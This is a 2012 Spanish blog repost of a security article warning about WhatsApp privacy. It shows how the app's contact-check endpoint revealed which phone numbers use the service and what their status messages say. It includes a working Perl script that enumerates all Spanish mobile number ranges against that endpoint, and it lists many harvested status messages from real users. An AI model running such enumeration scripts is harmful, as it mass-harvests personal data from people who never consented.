---
id: 372
title: Casi 10 millones de móviles españoles con WhatsApp instalado
author: Adolfo Antón Bravo
layout: post
guid: http://blogs.cuartocanal.es/infotics/?p=372
permalink: /2012/03/06/casi-10-millones-de-moviles-espanoles-con-whatsapp-instalado/
dublin_core_author:
  - Enter author here
dublin_core_subject:
  - Enter comma separated keywords here
dublin_core_title:
  - Enter title here
dublin_core_description:
  - Enter description here
dublin_core_source:
  - Enter source here
dublin_core_coverage:
  - Enter coverage here
dublin_core_relation:
  - Enter relation here
dublin_core_publisher:
  - Enter publisher here
dublin_core_contributor:
  - Enter contributor here
dublin_core_rights:
  - Enter rights here
dublin_core_format:
  - Enter format here
dublin_core_language:
  - Language will appear here
oc_metadata:
  - "{		version:'1.1',		tags: {}	}"
oc_commit_id:
  - http://blogs.cuartocanal.es/infotics/2012/03/06/casi-10-millones-de-moviles-espanoles-con-whatsapp-instalado/1331044002
dsq_thread_id:
  - 604122280
categories:
  - privacidad
  - seguridad
  - social
  - softwarelibre
  - tecnología
tags:
  - Alejandro Ramos
  - Blade Runner
  - españa
  - google
  - Ibiza
---
Artículo de [Alejandro Ramos][1] publicado en [Security By Default][2], <cite>espacio donde poder compartir experiencias y hablar de los aspectos técnicos relacionados con la seguridad informática</cite>, con [licencia Creative Commons Reconocimiento-No Comercial España][3] el [2 de marzo de 2012][4].  
Hemos realizado ligeros cambios -cursivas, negritas, enlaces- en la edición en aras de una mejor comprensión del texto.  
No hemos cambiado el título aunque habría que añadir a <cite>Casi 10 millones de móviles españoles con WhatsApp instalado</cite>, constituyen un peligro para la privacidad de lxs usuarixs. Lo reproducimos porque nos parece muy importante que lxs usuarixs sepamos los problemas que tienen las aplicaciones que usamos, los riesgos que conlleva dejarse llevar por la moda de un uso masivo irreflexivo y sin ninguna postura crítica. Realmente WhatsApp hace algo que con [Jabber][5] ya se puede hacer, bien sea en un servidor comercial como de hecho hace Google con Ytalk, bien en un servidor cooperativo o comunitario como [Jabberes.org][6]. Sin embargo, la facilidad de uso, el boca-oreja y sobre todo la moda ha hecho de WhatsApp la aplicación instalada en diez millones de móviles de España. ¿Qué ocurre con la tecnología y el uso que hacemos de ella?  
<figure style="width: 531px;" class="wp-caption alignnone">[<img alt="Whatsapp, fondo de escritorio por http://www.flickr.com/photos/abulhussain/5017703003/sizes/o/in/photostream/" src="http://i1.wp.com/blogs.cuartocanal.es/infotics/files/2012/03/5017703003_75e1edf347_o.png?resize=531%2C278" title="Whatsapp, fondo de escritorio por http://www.flickr.com/photos/abulhussain/5017703003/sizes/o/in/photostream/" data-recalc-dims="1" />][7]<figcaption class="wp-caption-text">Whatsapp, fondo de escritorio por http://www.flickr.com/photos/abulhussain/5017703003/sizes/o/in/photostream/</figcaption></figure>

## Casi 10 millones de móviles españoles con WhatsApp instalado

¡Qué pesados somos con [whatsapp][8]! Ya, bueno, eso es mentira. Realmente somos pesados con todo. Haciendo algunos ejercicios con aplicaciones de [iPhone][9], me dio por mirar  un poco **WhatsApp**, como [ya hiciera Yago][10] o [Alberto antes][11], pero es que la aplicación da tanto juego, que se puede hablar de ella muchas más veces.  
Una de las cosas que observé en ese análisis es que cuando arranca, comprueba el estado de tus contactos y de esa forma, sabe qué personas de tu agenda usan el servicio. Esta petición se realiza mediante *HTTPS* contra su *servidor web* con una llamada muy simple a la *URL*: <https://sro.whatsapp.net/client/iphone/iq.php>, que devuelve un `plist` con sus mensajes y disponibilidad.  
`<br />
<dict><br />
<key>P</key><br />
<string>+34600000158</string><br />
<key>T</key><br />
<integer>6151511</integer><br />
<key>S</key><br />
<string>Hey there! I am using WhatsApp.</string><br />
<key>JID</key><br />
<string>34600000158</string><br />
<key>NP</key><br />
<true/><br />
</dict><br />
`  
El resto de esta entrada,  pues ya os lo podéis imaginar: *script* en *perl*, lista de teléfonos registrados de España y a probar y cotillear cuantos hay usando el servicio y qué estados graciosos hay. ¿Aburrido? No, ¡inquieto!  
La lista de prefijos de teléfono registrados es pública y se puede descargar en un fichero *zip* de esta página web: [http://www.cmt.es/cmt\_ptl\_ext/SelectOption.do?nav=bases&categoria=descarga][12]  
<a href="http://i0.wp.com/4.bp.blogspot.com/-YI0Z9dKpQJU/T1CtxLMa-cI/AAAAAAAAGwA/xS7F65JKwgs/s1600/cmt.png" data-rel="lightbox-0" title=""><img src="http://i1.wp.com/blogs.cuartocanal.es/infotics/files/2012/03/cmt.png?resize=320%2C165" alt="" border="0" data-recalc-dims="1" /></a>  
El *script* en *perl* no es que soporte *threads* ni sea nada del otro mundo, pero oye&#8230; funciona.  
`</p>
<p>#!/usr/bin/perl<br />
use LWP::UserAgent;<br />
my $ua = new LWP::UserAgent;<br />
open A,"num.txt";<br />
my @a=<A>;<br />
my $i=0;<br />
foreach my $b (@a){<br />
chomp $b;<br />
foreach $g (0..99) {<br />
$i++;<br />
my $post="";<br />
$post="cd=1&cc=34&me=600000000";<br />
foreach(0..9999) {<br />
$post .= sprintf ("&u%%5B%%5D=%%2B34$b%02d%04d",$g,$_);<br />
}<br />
print "get $in";<br />
my $req = new HTTP::Request 'POST','https://sro.whatsapp.net/client/iphone/iq.php';<br />
$req->content_type('application/x-www-form-urlencoded');<br />
$req->content("$post");<br />
my $res = $ua->request($req);<br />
print $res->as_string;<br />
}<br />
}<br />
`  
El resultado, cuando lo ejecuté el 10 de febrero y tras generar un *log* de 2 *Gb*: **9.832.654** de números registrados.

Y algunos estados de gente graciosos:

**HACKERS:**

<string>pirateando conversaciones, menuda hacker</string>  
<string>Xx\_Hackero\_xX</string>  
<string>The Mind Hackers is Here!!!</string>  
<string>HACKERMAN !!!</string>  
<string>I&#8217;m not a Hacker, I&#8217;m a &#34;Security Professional&#34;</string>  
<string>Hacker</string>  
<string>\*\\*\* Hacker. Hacker \*\**</string>  
<string>Hacker mater</string>  
<string>hacker</string>  
<string>Hacker î  
</string>  
<string>Heart Hacker Rembo Now Is Here</string>  
<string>Hacker</string>  
<string>Soy una hacker!!!!&#8230;patosa!!!î  
</string>  
<string>MaDr!D HaCKeR</string>  
<string>De Hacker por la Red</string>  
<string>Hacker</string>  
<string>The HACKER</string>  
<string>De examenes toda la semana.. Certified Ethical Hacker</string>  
<string>Don&#8217;t Panic! A &#8216;hacker&#8217; is different from a &#8216;cracker&#8217;.</string>  
<string>Te reviento hacker!! Jaja</string>  
<string>~Hacker~</string>  
<string>android hacker</string>  
<string>@andyyhacker</string>  
<string>Quien viene a ver Hackers?????</string>  
<string>Hacker, Blade Runner.</string>  
<string>ahhahah soy un porulo hacker :Pî  
½</string>  
<string>Hackerdelmelo is hacking OFM</string>  
<string>Saber romper medidas de seguridad no hacen k seas hacker al igual que saber hacer un puente en un coche no te convierte en un ingeniero</string>  
<string>Me sty volviendo hacker</string>  
<string>Xx\_putoshackers\_xX</string>  
<string>el puto hacker</string>  
<string>î®HACKERî®</string>  
<string>Y si, morire de frio o de sueÃ±o, quiero ser hacker u3u</string>  
<string>el hacker crea y el gobierno destruye</string>  
<string>VOTAD x ROLLING HACKERS!!!</string>  
<string>Los hackers son los padres</string>  
<string>CagÃ¼en el hacker&#8230;</string>  
<string>îMarzo Negro.contra la ley sopa.ANONYMUS planea el mayor atake hacker</string>  
<string>Certified Ethical Hacker</string>  
<string>Mi Objetivo: Hacker de la vida</string>

**SECURITY**

<string>I&#8217;m not a Hacker, I&#8217;m a &#34;Security Professional&#34;</string>  
<string>Ibiza Security</string>  
<string>Shadows Are Security</string>  
<string>Buguroo Offensive Security</string>  
<string>Gordo Te amo (L) bailar,bailar,bailar! Security dance! <img src="http://i1.wp.com/blogs.cuartocanal.es/infotics/wp-includes/images/smilies/simple-smile.png?w=660" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" data-recalc-dims="1" /> mucha fiesta y muchas actuaciones! :p</string>  
<string>the security men</string>  
<string>SecurityViolationException: empty head on &#8216;remote_user&#8217;:47</string>  
<string>Panda Security &#8211; cloudantivirus.com</string>  
<string>Ibiza Security</string>  
<string>Your Security is my Business&#8230;</string>  
<string>Paid off security and got through the gate&#8230;</string>  
<string>I&#8217;ll be ur security!!</string>  
<string>security!!!! ai ai ai ai</string>  
<string>security private î  
con dos cojones vamos a x elloî</string>  
<string>Grupo Security Dogs</string>  
<string>internet and security terrorims</string>

Y finalmente, uno de mis favoritos:

**<****string>Yo no digo que esa chica sea un poco suelta, solo digo que si su entrepierna tuviera contraseña, serí­a &#8216;1234&#8217;**<**/string****>**

 [1]: http://www.twitter.com/aramosf
 [2]: http://www.securitybydefault.com/
 [3]: http://creativecommons.org/licenses/by-nc/2.5/es/
 [4]: http://www.securitybydefault.com/2012/03/casi-10-millones-de-moviles-espanoles.html
 [5]: http://www.jabber.org/
 [6]: http://www.jabberes.org/
 [7]: http://www.flickr.com/photos/abulhussain/5017703003/sizes/o/in/photostream/
 [8]: http://www.whatsapp.com/
 [9]: http://store.apple.com/es/browse/home/shop_iphone/family/iphone
 [10]: http://www.securitybydefault.com/2011/06/lo-que-no-te-cuenta-whatsapp.html
 [11]: http://www.securitybydefault.com/2012/01/whatsapp-al-descubierto.html
 [12]: http://www.cmt.es/cmt_ptl_ext/SelectOption.do?nav=bases&categoria=descarga